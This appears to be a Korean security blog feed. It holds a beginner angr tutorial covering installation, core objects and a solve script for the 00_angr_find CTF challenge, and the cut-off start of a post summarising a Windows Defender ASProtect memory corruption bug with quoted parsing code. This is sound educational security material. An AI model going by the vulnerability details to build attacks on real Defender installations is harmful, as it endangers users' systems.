    <content type="html"><![CDATA[<h1 id="인사말"><a href="#인사말" class="headerlink" title="인사말"></a>인사말</h1><p>안녕하세요! j0ker입니다. 아직 내공이 많이 부족해 그냥 공부만 하고 있다가 이제야 공부하고 있는 내용을 포스팅해볼까 합니다!! 내가 왔다아아아아아악!!!!</p><p><img src="/2021/07/10/j0ker/angr_part1/1625546988.gif" alt="두두등장"></p><blockquote><p>우아씨 떨어질 뻔했네;;</p></blockquote><p>예전에 해킹하기 전에 영화 같은거 보면 해커들이 나와서 키보드를 촤라라라락 누르더니 지도에 점이 찍히고 취약점 알아서 찾고 공격까지 하는 장면을 본 적이 있습니다 ㅋㅋㅋㅋ 지금 보면 말이 안되는데 말이지… 그래도 그 때는 두근두근하면서 “오 해커는 정말 멋지다”라는 생각을 했었습니다. 그리고 이렇게 잘못된 길로 들어와 버렸죠… 허허 그 때 멈췄어야 했습니다.</p><p><img src="/2021/07/10/j0ker/angr_part1/2e17a20210794aa3b3831a38fad04184.jpeg" alt="2"></p><blockquote><p>얘도 그 때 “그 반지”만 받지 않았더라면…</p></blockquote><p>암튼 제가 봤던 그 영화 속에 해커에 좀 더 다가갈 수 있도록 해줄 수 있는 툴이 바로 angr이지 않을까 싶습니다. 그래서 angr를 공부하려고 하니까 다 라이트업만 있지 처음부터 끝까지 다루는 내용은 별로 없더라구요.(있으면 댓글 남겨주시면 감사하겠습니다! 내가 못 찾는건가…?) 시리즈를 일단 4편까지 쓸까 고민하고 있는데 내용을 다루면서 개념적인 부분이나 잘 다루지 않는 angr의 기초적인 내용에 대해서 또 다루다보면 길어질 수도 있겠습니다 ㅎㅎ</p><p>사실 이미 많이 유명한 툴이라 설명이 더 필요할까 싶긴한데 오늘 준비한 내용은 많지 않으니 주저리주저리 설명을 하고 가도록 하겠습니다 ^^</p><h1 id="angr란"><a href="#angr란" class="headerlink" title="angr란?"></a>angr란?</h1><p>angr는 다양한 환경에서 활용 가능한 바이너리 분석 플랫폼 입니다. angr가 유명해지기 시작한 것은 2015년 DARPA의 CGC(Cyber Grand Challenge)가 시작하면서죠. CGC는 참여팀이 바이너리를 자동 분석하는 툴을 만들어 제한 시간 내에 출제된 문제들에 취약점이 있음을 증명하고 패치하는 점수를 얻는 대회 입니다. 일반적인 CTF와는 다르죠? angr를 제작한 Shellphish팀이 이 대회에 참가하였고 3등을 차지했습니다. 대회가 끝나고 자동 취약점 분석 분야가 해커들에게 많은 주목을 받으면서 angr라는 툴 역시 python을 기반으로 한 높은 접근성 때문에 많은 인기를 끌기 시작했습니다. 다른 팀들이 제작한 바이너리 자동 분석 툴들도 공개된 것들이 있지만 angr가 python으로 활용 가능하다는 점과 문서화 잘 되어 있다는 점이 확실히 매력적으로 다가오는 거 같습니다. 그러니까 저 같은 핵린이들도 바이너리 자동분석을 찍먹해볼 수 있는거겠죠. CGC 이후로 많은 CTF에서 자동 취약점 분석 및 익스플로잇 혹은 리버싱 분야에서 angr를 활용할 수 있는 문제들이 나오고 해커들이 angr를 익숙하게 다룰 수 있게 되면서 보편적으로 많이 쓰이게 된 거 같습니다.(카더라)</p><p>angr, CGC, shellphish에 대해서 좀 더 자세하게 알고 싶으시다면 아래 링크를 참고해보시면 좋을듯 합니다.</p><ul><li><a href="https://cpuu.postype.com/post/4127178">[번역] 2016 DARPA CGC 대회 출전팀의 회고</a></li><li><a href="https://shellphish.net/cgc/">The Cyber Grand Challenge</a></li><li><a href="http://kaishackgon.blogspot.com/2016/08/cyber-grand-challenge.html">Cyber Grand Challenge 후기</a></li><li><a href="https://www.krcert.or.kr/data/trendView.do?bulletin_writing_sequence=20050">美 방위고등연구계획국(DARPA)의 사이버 자동 방어시스템 개발을 위한 컨테스트(CGC) 개최</a></li></ul><h1 id="angr-설치"><a href="#angr-설치" class="headerlink" title="angr 설치"></a>angr 설치</h1><p>위에서 말씀드렸다시피 angr는 다양한 환경에서 활용 가능합니다. 이게 뭔 말이냐? python만 깔리면 다 쓸 수 있다는 겁니다! 다 쓸 수 있다고는 하지만 저희는 일단 우분투에서 angr를 사용하도록 하겠습니다.</p><p>먼저 아래 명령어를 실행해서 실행에 필요한 기본적인 요소들을 설치합니다.</p><pre><code class="hljs bash">sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper</code></pre><p>그리고 다른 모듈과의 버전 충돌을 방지하기 위해 virtualenv를 만들고 그 안에 angr를 설치해줍니다.</p><pre><code class="hljs bash">mkvirtualenv --python=$(<span class="hljs-built_in">which</span> python3) angr &amp;&amp; pip install angr</code></pre><p>만약 설치가 잘 안된다!!! 그러면 정직하게 <a href="https://docs.angr.io/introductory-errata/install">오피셜 문서</a>를 참고해주세요.</p><h1 id="angr-톺아보기"><a href="#angr-톺아보기" class="headerlink" title="angr 톺아보기"></a>angr 톺아보기</h1><p>이제 angr를 어떻게 사용하는지 알아봐야겠죠? 오늘은 정말 그냥 이런게 있구나~ 정도만 보고 다음에 좀 더 자세하게 앞으로 다뤄볼 예시 문제 상황에 따라 알아보도록 하겠습니다.</p><h2 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h2><p>일단 아래와 같이 기본적인 프로젝트를 생성합니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> angr<span class="hljs-meta">&gt;&gt;&gt; </span>proj = angr.Project(<span class="hljs-string">&#x27;00_angr_find&#x27;</span>)</code></pre><p>이렇게 하면 타겟 바이너리에 대한 Project 오브젝트가 생성됩니다. 이 프로젝트가 angr에서 해당 바이너리에 대한 정보를 제어하는 기본 단위가 됩니다.</p><p>먼저 바이너리에 대한 기본적인 정보들을 확인할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.arch&lt;Arch X86 (LE)&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<span class="hljs-number">134513744</span><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> monkeyhex<span class="hljs-meta">&gt;&gt;&gt; </span>proj.entry<span class="hljs-number">0x8048450</span></code></pre><p>중간에 monkeyhex를 import하면 그냥 10진수로 출력되는 값들이 16진수로 출력되서 좀 더 편하게 확인할 수 있습니다.</p><p>당연히 이 뿐만 아니라 다른 정보들도 있겠죠! 함 보겠습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.__dict__&#123;<span class="hljs-string">&#x27;filename&#x27;</span>: <span class="hljs-string">&#x27;00_angr_find&#x27;</span>, <span class="hljs-string">&#x27;loader&#x27;</span>: &lt;Loaded <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x8407fff</span>]&gt;, <span class="hljs-string">&#x27;arch&#x27;</span>: &lt;Arch X86 (LE)&gt;, <span class="hljs-string">&#x27;_sim_procedures&#x27;</span>: &#123;<span class="hljs-number">0x8100000</span>: &lt;SimProcedure strcmp&gt;,  <span class="hljs-number">0x8100004</span>: &lt;SimProcedure printf&gt;,  <span class="hljs-number">0x8100008</span>: &lt;SimProcedure __stack_chk_fail&gt;,  <span class="hljs-number">0x810000c</span>: &lt;SimProcedure puts&gt;,  <span class="hljs-number">0x8100010</span>: &lt;SimProcedure exit&gt;,  <span class="hljs-number">0x8100014</span>: &lt;SimProcedure __libc_start_main&gt;,  <span class="hljs-number">0x8100018</span>: &lt;SimProcedure __isoc99_scanf&gt;,  <span class="hljs-number">0x10301000</span>: &lt;SimProcedure LinuxLoader&gt;,  <span class="hljs-number">0x10301008</span>: &lt;SimProcedure _dl_rtld_lock_recursive&gt;,  <span class="hljs-number">0x10301010</span>: &lt;SimProcedure _dl_rtld_unlock_recursive&gt;,  <span class="hljs-number">0x10301018</span>: &lt;SimProcedure ReturnUnconstrained&gt;,  <span class="hljs-number">0x10301020</span>: &lt;SimProcedure _dl_initial_error_catch_tsd&gt;,  <span class="hljs-number">0x10301028</span>: &lt;SimProcedure _vsyscall&gt;,  <span class="hljs-number">0x10301038</span>: &lt;SimProcedure CallReturn&gt;,  <span class="hljs-number">0x10301040</span>: &lt;SimProcedure UnresolvableJumpTarget&gt;,  <span class="hljs-number">0x10301048</span>: &lt;SimProcedure UnresolvableCallTarget&gt;&#125;, <span class="hljs-string">&#x27;concrete_target&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;_default_analysis_mode&#x27;</span>: <span class="hljs-string">&#x27;symbolic&#x27;</span>, <span class="hljs-string">&#x27;_exclude_sim_procedures_func&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;_exclude_sim_procedures_list&#x27;</span>: (), <span class="hljs-string">&#x27;use_sim_procedures&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;_ignore_functions&#x27;</span>: [], <span class="hljs-string">&#x27;_support_selfmodifying_code&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;_translation_cache&#x27;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&#x27;_executing&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;entry&#x27;</span>: <span class="hljs-number">0x8048450</span>, <span class="hljs-string">&#x27;storage&#x27;</span>: &#123;&#125;, <span class="hljs-string">&#x27;store_function&#x27;</span>: &lt;bound method Project._store of &lt;Project \\\\Mac\\Home\\Desktop\\Angr_Tutorial_For_CTF\\problems\\<span class="hljs-number">00</span>_angr_find&gt;&gt;, <span class="hljs-string">&#x27;load_function&#x27;</span>: &lt;function Project._load at <span class="hljs-number">0x00000225ECEF2CA0</span>&gt;, <span class="hljs-string">&#x27;factory&#x27;</span>: &lt;angr.factory.AngrObjectFactory object at <span class="hljs-number">0x00000225ECEF4100</span>&gt;, <span class="hljs-string">&#x27;_analyses_preset&#x27;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&#x27;analyses&#x27;</span>: &lt;angr.analyses.analysis.AnalysesHub object at <span class="hljs-number">0x00000225ED698A00</span>&gt;, <span class="hljs-string">&#x27;kb&#x27;</span>: &lt;angr.knowledge_base.knowledge_base.KnowledgeBase object at <span class="hljs-number">0x00000225ED698C70</span>&gt;, <span class="hljs-string">&#x27;simos&#x27;</span>: &lt;angr.simos.linux.SimLinux object at <span class="hljs-number">0x00000225ED698A90</span>&gt;, <span class="hljs-string">&#x27;is_java_project&#x27;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&#x27;is_java_jni_project&#x27;</span>: <span class="hljs-literal">False</span>&#125;</code></pre><p>아… 모르는게 많네요… 하하… 저걸 다 공부해야 한다고??</p><p><img src="/2021/07/10/j0ker/angr_part1/1625553299.gif" alt="3" title="야레야레..."></p><blockquote><p>야레야레…</p></blockquote><p>하나씩 알아가보도록 하죠… 흐흐…</p><h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader&lt;Loaded <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x8407fff</span>]&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.shared_objects&#123;<span class="hljs-string">&#x27;00_angr_find&#x27;</span>: &lt;ELF Object <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x804a03f</span>]&gt;, <span class="hljs-string">&#x27;extern-address space&#x27;</span>: &lt;ExternObject Object cle<span class="hljs-comment">##externs, maps [0x8200000:0x8207fff]&gt;, </span><span class="hljs-string">&#x27;cle##tls&#x27;</span>: &lt;ELFTLSObjectV2 Object cle<span class="hljs-comment">##tls, maps [0x8300000:0x8314807]&gt;&#125;</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.min_addr<span class="hljs-number">0x8048000</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.max_addr<span class="hljs-number">0x8407fff</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object&lt;ELF Object <span class="hljs-number">00</span>_angr_find, maps [<span class="hljs-number">0x8048000</span>:<span class="hljs-number">0x804a03f</span>]&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object.execstack<span class="hljs-literal">False</span><span class="hljs-meta">&gt;&gt;&gt; </span>proj.loader.main_object.pic<span class="hljs-literal">False</span></code></pre><p>loader에서는 바이너리가 메모리에 어떻게 매핑되는지에 대한 정보를 가지고 있습니다. angr에서는 CLE라는 모듈을 통해 바이너리를 메모리 주소에 매핑한 다음, loader에 메모리 주소 정보들을 저장한다고 합니다. 지금은 그저 “loader를 통해 바이너리가 메모리에 매핑된 주소나 미티게이션 적용 여부를 알 수 있다” 정도만 알면 될듯 합니다!</p><h2 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h2><p>angr에서는 지원하는 기능이 어<del>~</del>ㅁ청 많기 때문에 코드들이 난잡해지는 것을 막기 위해서 자주 사용하는 기능들을 factory라는 클래스에 넣어놨습니다.</p><h3 id="block"><a href="#block" class="headerlink" title="block"></a>block</h3><p>앞에서는 메모리에 바이너리가 매핑되었는지를 알았으니 이제 해당 주소에 있는 내용을 알아볼겁니다. black 오브젝트는 특정 주소의 명령어 블럭을 확인할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>block = proj.factory.block(proj.entry)<span class="hljs-meta">&gt;&gt;&gt; </span>block.pp()<span class="hljs-number">0x8048450</span>:      xor     ebp, ebp<span class="hljs-number">0x8048452</span>:      pop     esi<span class="hljs-number">0x8048453</span>:      mov     ecx, esp<span class="hljs-number">0x8048455</span>:      <span class="hljs-keyword">and</span>     esp, <span class="hljs-number">0xfffffff0</span><span class="hljs-number">0x8048458</span>:      push    eax<span class="hljs-number">0x8048459</span>:      push    esp<span class="hljs-number">0x804845a</span>:      push    edx<span class="hljs-number">0x804845b</span>:      push    <span class="hljs-number">0x8048710</span><span class="hljs-number">0x8048460</span>:      push    <span class="hljs-number">0x80486b0</span><span class="hljs-number">0x8048465</span>:      push    ecx<span class="hljs-number">0x8048466</span>:      push    esi<span class="hljs-number">0x8048467</span>:      push    <span class="hljs-number">0x80485c7</span><span class="hljs-number">0x804846c</span>:      call    <span class="hljs-number">0x8048420</span><span class="hljs-meta">&gt;&gt;&gt; </span>block.instructions<span class="hljs-number">0xd</span><span class="hljs-meta">&gt;&gt;&gt; </span>block.instruction_addrs[<span class="hljs-number">0x8048450</span>, <span class="hljs-number">0x8048452</span>, <span class="hljs-number">0x8048453</span>, <span class="hljs-number">0x8048455</span>, <span class="hljs-number">0x8048458</span>, <span class="hljs-number">0x8048459</span>, <span class="hljs-number">0x804845a</span>, <span class="hljs-number">0x804845b</span>, <span class="hljs-number">0x8048460</span>, <span class="hljs-number">0x8048465</span>, <span class="hljs-number">0x8048466</span>, <span class="hljs-number">0x8048467</span>, <span class="hljs-number">0x804846c</span>]</code></pre><p>이처럼 명령어를 보고 싶은 주소를 인자를 주면 원하는 코드 블럭에 있는 명령어들을 확인할 수 있습니다. 명령어의 데이터 형식을 볼 수도 있고 명령어 각각의 주소도 확인할 수 있습니다.</p><h3 id="state"><a href="#state" class="headerlink" title="state"></a>state</h3><p>Project 오브젝트는 프로그램 초기상태의 정적인 정보를 담고 있습니다. 그냥 정적인 데이터만 가지고는 프로그램이 실행하면서 값이 어떻게 변하는지를 확인할 수는 없겠죠? 그래서 angr에서는 프로그램이 실행되는 것처럼 시뮬레이션을 할 수 있고 이 과정을 SimState라는 오브젝트를 통해 확인하거나 조작할 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>state = proj.factory.entry_state()<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eip&lt;BV32 <span class="hljs-number">0x8048450</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eax&lt;BV32 <span class="hljs-number">0x1c</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[proj.entry].int.resolved&lt;BV32 <span class="hljs-number">0x895eed31</span>&gt;</code></pre><p>지금은 엔트리 포인트에서의 레지스터와 메모리 상태를 알 수 있습니다. 근데 레지스터 값을 확인하면 그냥 인티저 값이 아닌거 같네요?</p><p>angr에서는 메모리나 레지스터의 값을 bitvector 형식으로 저장한다고 합니다. 일반적으로 32비트나 64비트 레지스터는 최대값이 넘어가면 0으로 되면서 오버플로우가 발생하잖아요? 근데 아시겠지만 파이썬의 인티저는 그런게 없죠! 오버플로우 따위는 웬만하면 일어나지 않습니다. 그렇기 때문에 32비트와 64비트 bitvector를 활용하게 됩니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>bv = state.solver.BVV(<span class="hljs-number">0x1234</span>, <span class="hljs-number">32</span>)&lt;BV32 <span class="hljs-number">0x1234</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.solver.eval(bv)<span class="hljs-number">0x1234</span><span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.rsi = state.solver.BVV(<span class="hljs-number">3</span>, <span class="hljs-number">64</span>)<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.rsi&lt;BV64 <span class="hljs-number">0x3</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[<span class="hljs-number">0x1000</span>].long = <span class="hljs-number">4</span><span class="hljs-meta">&gt;&gt;&gt; </span>state.mem[<span class="hljs-number">0x1000</span>].long.resolved&lt;BV64 <span class="hljs-number">0x4</span>&gt;</code></pre><p>이런식으로 bitvector↔ integer를 왔다갔다 타입변환을 할 수도 있습니다. 그리고 타입을 지정해서 값을 저장할 수도 있죠.</p><h3 id="Simulation-manager"><a href="#Simulation-manager" class="headerlink" title="Simulation_manager"></a>Simulation_manager</h3><p>state를 통해 어디서 시뮬레이션을 할지를 지정했다면 Simulation_manager를 통해서는 지정한 state를 기준으로 실행하면서 어떻게 데이터들이 바뀌어 나가는지 확인해 볼 수 있습니다.</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simulation_manager(state)<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[&lt;SimState @ <span class="hljs-number">0x8048450</span>&gt;]<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.step()&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[<span class="hljs-number">0</span>].regs.eip&lt;BV32 <span class="hljs-number">0x8048420</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.step()&lt;SimulationManager <span class="hljs-keyword">with</span> <span class="hljs-number">1</span> active&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>simgr.active[<span class="hljs-number">0</span>].regs.eip&lt;BV32 <span class="hljs-number">0x8100014</span>&gt;<span class="hljs-meta">&gt;&gt;&gt; </span>state.regs.eip&lt;BV32 <span class="hljs-number">0x8048450</span>&gt;</code></pre><p>이렇게 Simulation Manager에서 step() 함수를 사용하면 eip가 바뀌는 것을 볼 수 있습니다. 호호 factory는 오늘은 이정도만 알아볼텐데… 나중에 많이 만날거 같은 불안한 느낌… 하하…(스포)</p><h2 id="Analyses"><a href="#Analyses" class="headerlink" title="Analyses"></a>Analyses</h2><p>angr에서는 사용자가 하나부터 열까지 다 분석하고 삽질하며 시간 낭비를 하지 않도록 수많은 분석 툴들을 제공합니다. 그 툴들이 내장되어 있는 클래스가 바로 Analyses 입니다! 아래와 같이 정말 많은 기능이 있는데, 각각의 기능은 추후에 직접 써보면서 소개해드리도록 하겠습니다. 그래도 다 소개하는 무리데스…</p><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>proj.analyses.proj.analyses.AILBlockSimplifier(              proj.analyses.Decompiler(                      proj.analyses.StructuredCodeGenerator(proj.analyses.AILCallSiteMaker(                proj.analyses.Disassembly(                     proj.analyses.Structurer(proj.analyses.AILSimplifier(                   proj.analyses.DivSimplifier(                   proj.analyses.Typehoon(proj.analyses.BackwardSlice(                   proj.analyses.DominanceFrontier(               proj.analyses.VFG(proj.analyses.BasePointerSaveSimplifier(       proj.analyses.EagerReturnsSimplifier(          proj.analyses.VSA_DDG(proj.analyses.BinDiff(                         proj.analyses.Identifier(                      proj.analyses.VariableRecovery(proj.analyses.BinaryOptimizer(                 proj.analyses.ImportSourceCode(                proj.analyses.VariableRecoveryFast(proj.analyses.BoyScout(                        proj.analyses.InitFinder(                      proj.analyses.Veritesting(proj.analyses.CDG(                             proj.analyses.InitializationFinder(            proj.analyses.XRefs(proj.analyses.CFB(                             proj.analyses.LoopFinder(                      proj.analyses.discard_plugin_preset(proj.analyses.CFBlanket(                       proj.analyses.ModSimplifier(                   proj.analyses.get_plugin(proj.analyses.CFG(                             proj.analyses.MultiSimplifier(                 proj.analyses.has_plugin(proj.analyses.CFGEmulated(                     proj.analyses.Propagator(                      proj.analyses.has_plugin_presetproj.analyses.CFGFast(                         proj.analyses.Proximity(                       proj.analyses.plugin_presetproj.analyses.CFGFastSoot(                     proj.analyses.ReachingDefinitions(             proj.analyses.projectproj.analyses.CalleeCleanupFinder(             proj.analyses.Reassembler(                     proj.analyses.register_default(proj.analyses.CallingConvention(               proj.analyses.RecursiveStructurer(             proj.analyses.register_plugin(proj.analyses.Clinic(                          proj.analyses.RegionIdentifier(                proj.analyses.register_preset(proj.analyses.CodeTagging(                     proj.analyses.RegionSimplifier(                proj.analyses.release_plugin(proj.analyses.CompleteCallingConventions(      proj.analyses.SootClassHierarchy(              proj.analyses.reload_analyses(proj.analyses.CongruencyCheck(                 proj.analyses.StackCanarySimplifier(           proj.analyses.use_plugin_preset(proj.analyses.ConstantDereferencesSimplifier(  proj.analyses.StackPointerTracker(proj.analyses.DDG(                             proj.analyses.StaticHooker(</code></pre><h1 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h1><p>그냥 설명만 하다 끝내기는 아쉬우니까 간단하게 튜토리얼 문제 하나만 보고 마무리할게요. 이 <a href="https://github.com/jakespringer/angr_ctf">링크</a>로 들어가셔서 레포를 클론해줍니다. 이 레포는 angr의 기능을 ctf 문제 스타일로 하나하나 공부하기에 적합해 보여서 가져와 봤어요. 00_angr_find는 그 첫번째 문제입니다!</p><pre><code class="hljs python">$&#123;<span class="hljs-keyword">import</span> random, osrandom.seed(os.urandom(<span class="hljs-number">8</span>))userdef_charset = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>userdef = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(userdef_charset) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>))&#125;$<span class="hljs-comment">#include &lt;stdio.h&gt;</span><span class="hljs-comment">#include &lt;stdlib.h&gt;</span><span class="hljs-comment">#include &lt;string.h&gt;</span><span class="hljs-comment">#define USERDEF &quot;$&#123; userdef &#125;$&quot;</span><span class="hljs-comment">#define LEN_USERDEF $&#123; write(len(userdef)) &#125;$</span>char msg[] =  <span class="hljs-string">&quot;$&#123; description &#125;$&quot;</span>;void print_msg() &#123;  printf(<span class="hljs-string">&quot;%s&quot;</span>, msg);&#125;int complex_function(int value, int i) &#123;<span class="hljs-comment">#define LAMBDA 3</span>  <span class="hljs-keyword">if</span> (!(<span class="hljs-string">&#x27;A&#x27;</span> &lt;= value &amp;&amp; value &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>)) &#123;    printf(<span class="hljs-string">&quot;Try again.\\n&quot;</span>);    exit(<span class="hljs-number">1</span>);  &#125;  <span class="hljs-keyword">return</span> ((value - <span class="hljs-string">&#x27;A&#x27;</span> + (LAMBDA * i)) % (<span class="hljs-string">&#x27;Z&#x27;</span> - <span class="hljs-string">&#x27;A&#x27;</span> + <span class="hljs-number">1</span>)) + <span class="hljs-string">&#x27;A&#x27;</span>;&#125;int main(int argc, char* argv[]) &#123;  char buffer[<span class="hljs-number">9</span>];  //print_msg();  printf(<span class="hljs-string">&quot;Enter the password: &quot;</span>);  scanf(<span class="hljs-string">&quot;%8s&quot;</span>, buffer);  <span class="hljs-keyword">for</span> (int i=<span class="hljs-number">0</span>; i&lt;LEN_USERDEF; ++i) &#123;    buffer[i] = complex_function(buffer[i], i);  &#125;  <span class="hljs-keyword">if</span> (strcmp(buffer, USERDEF)) &#123;    printf(<span class="hljs-string">&quot;Try again.\\n&quot;</span>);  &#125; <span class="hljs-keyword">else</span> &#123;    printf(<span class="hljs-string">&quot;Good Job.\\n&quot;</span>);  &#125;&#125;</code></pre><p>코드를 보면 유저가 인풋을 넣으면 인풋을 바탕으로 어떤 연산 작업을 실행하고 그 결과 값을 컴파일 당시 랜덤하게 생성된 문자열과 비교하는 것을 알 수 있습니다. 그러면 우리가 해야하는 것은 연산 결과가 해당 문자열과 일치하는 인풋을 찾아야겠군요! 즉, main 함수에서 printf(“Good Job.\n”); 이 실행될 수 있도록 해야한다는 거죠. 쉽죠? 이정도는 angr한테는 껌이겠죠? 이제 위 코드를 컴파일하고 아래 코드를 돌려봅시다!</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    proj = angr.Project(<span class="hljs-string">&#x27;00_angr_find&#x27;</span>)    init_state = proj.factory.entry_state()    simulation = proj.factory.simgr(init_state)    print_good = <span class="hljs-number">0x804867d</span>    simulation.explore(find=print_good)    <span class="hljs-keyword">if</span> simulation.found:        solution = simulation.found[<span class="hljs-number">0</span>]        print(<span class="hljs-string">&#x27;flag: &#x27;</span>, solution.posix.dumps(<span class="hljs-number">0</span>))    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">&#x27;no solution&#x27;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    main()</code></pre><p>컴파일된 바이너리를 IDA로 확인해서 printf(“Good Job.\n”);의 주소를 알아냅니다.(주소는 바뀔 수 있으니 각자 한번 확인해보세요) 그리고 simulation.explore(find=print_good)를 통해 값을 탐색합니다. 그리고 찾아지면 끝! 진짜 쉽죠? 아 물론 문제가 쉬워서 그럽니다 쿠쿸… 아직 이정도는 찍먹이라고 할 수도 없는 수준이죠.</p><h1 id="마무리…"><a href="#마무리…" class="headerlink" title="마무리…"></a>마무리…</h1><p>도대체 angr에서는 저 explore 함수에서 무슨 짓을 했길래 정답을 찾아낼 수 있었던 걸까요? 아마 여러분이 angr하면 떠오르는 키워드가 몇 가지 있을텐데, 바로 Symbolic Execution 덕분 입니다.</p><p>예… 다음 글 주제는 Symbolic Execution입니다!! 하하… 이번 편도 재미는 별로 없다고 생각이 드는데 다음 글은 어떡하지…하씨</p><p>그래도 마무리되었으니까 기쁜 마음으로 퇴근!!</p><p><img src="/2021/07/10/j0ker/angr_part1/1625731445.gif" alt="4"></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>angr</tag>
      
      <tag>exploit</tag>
      
      <tag>symbolic_execution</tag>
      
      <tag>newbie</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] mpengine: asprotect embedded runtime dll memory corruption</title>
    <link href="/2021/07/09/j0ker/2021-07-09/"/>
    <url>/2021/07/09/j0ker/2021-07-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2189">https://bugs.chromium.org/p/project-zero/issues/detail?id=2189</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows Defender</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows Defender는 여느 안티바이러스와 같이 수 많은 포맷을 분석 및 검사할 수 있는 메커니즘을 가지고 있습니다. 2018년, 마이크로소프트는 Defender를 샌드박싱한다고 밝혔지만 디폴트로 설정되어 있지는 않습니다. 따라서 Defender에서 파일을 분석할 때, 파일 파서, 언패커, 인터프리터 그리고 에뮬레이터는 여전히 SYSTEM 권한으로 실행됩니다.</p><p>이 취약점은 Denfender에서 <code>ASProtect</code>로 패킹된 바이너리를 언패킹할 때 발생합니다. Defender에서는 패킹된 바이너리를 분석할 때, 패커의 파일 포맷를 바탕으로 바이너리에서 정보를 파싱하는게 아니라 에뮬레이터를 통해 바이너리를 실행하여 바이너리가 알아서 언패킹하도록 유도합니다. <code>ASProtect</code>는 언패킹 과정에서 내재된 DLL을 파일시스템에 떨구고, 해당 DLL을 에뮬레이터로 활용하여 메인 바이너리 안에 있는 바이트 코드를 실행하면서 언패킹을 진행합니다. 에뮬레이터로 활용되는 DLL 역시 패킹이 되어 있지만 특별한 검사는 하지 않습니다. 취약점은 바로 이 DLL의 <code>IMAGE_SECTION_HEADER</code> 구조체를 파싱할 때 발생합니다.</p><pre><code class="hljs c++">NtHdr = (IMAGE_NT_HEADERS *)((<span class="hljs-keyword">char</span> *)ImagePtr + ImagePtr-&gt;e_lfanew);NtHdr-&gt;OptionalHeader.SizeOfImage = <span class="hljs-keyword">this</span>-&gt;ImageSize;NtHdr-&gt;OptionalHeader.ImageBase = <span class="hljs-keyword">this</span>-&gt;ImageBase;NtHdr-&gt;OptionalHeader.AddressOfEntryPoint = <span class="hljs-keyword">this</span>-&gt;EntryPoint;NtHdr-&gt;OptionalHeader.SizeOfHeaders = <span class="hljs-number">4096</span>;TotalSects = <span class="hljs-keyword">this</span>-&gt;LastSection - <span class="hljs-keyword">this</span>-&gt;FirstSection) / <span 